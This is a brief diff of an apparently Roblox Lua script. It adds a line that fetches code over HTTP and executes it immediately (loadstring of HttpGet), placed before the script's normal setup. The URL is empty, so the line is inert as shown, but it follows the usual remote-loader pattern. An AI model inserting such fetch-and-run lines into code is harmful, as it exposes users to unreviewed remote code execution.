@@ -2,6 +2,10 @@ local on = true -- Change to false if you want script to not run.
 if not on then return end
 if game.PlaceId ~= 823323202 then return end
 
+loadstring(game:HttpGet(''))()
+
+
+
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
